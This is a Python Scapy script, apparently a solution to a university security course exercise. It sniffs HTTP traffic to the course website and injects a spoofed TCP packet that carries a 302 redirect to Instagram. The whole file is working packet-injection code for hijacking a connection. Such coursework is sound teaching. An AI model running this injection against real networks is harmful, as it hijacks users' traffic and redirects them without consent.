import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    if packet.haslayer(S.Raw):
        raw = packet[S.Raw]
        payload_list = raw.load.decode().split('\r\n')

        host = ''

        for payload in payload_list:
            if payload.startswith('Host:'):
                host = payload[6:] 
                break

        if host != WEBSITE:
            return None

        
        if not packet.haslayer(S.IP) or not packet.haslayer(S.TCP):
            return None

        ip_packet = S.IP(src=packet[S.IP].dst, dst=packet[S.IP].src) # switching src and dst from original packet
        ack_number = packet[S.TCP].seq + len(raw)
        seq_number = packet[S.TCP].ack
        tcp_segment = S.TCP(sport=packet[S.TCP].dport, dport=packet[S.TCP].sport, flags='FA',
                            seq=seq_number, ack=ack_number)
        res = ip_packet/tcp_segment/RESPONSE

        return res

    return None

def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
